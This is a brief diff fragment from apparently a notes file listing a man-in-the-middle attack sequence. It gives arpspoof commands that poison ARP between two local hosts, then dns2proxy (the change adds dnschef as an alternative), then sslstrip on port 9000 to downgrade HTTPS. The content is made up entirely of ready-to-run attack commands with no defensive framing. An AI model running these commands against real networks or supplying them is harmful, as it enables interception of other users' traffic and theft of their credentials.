@@ -15,7 +15,7 @@ arpspoof -i eth0 -t 10.20.20.132 10.20.20.2
 
 arpspoof -i eth0 -t 10.20.20.2 10.20.20.132
 
-python dns2proxy.py
+python dns2proxy.py  ( dnschef -h )
 
 sslstrip -l 9000 -a
 
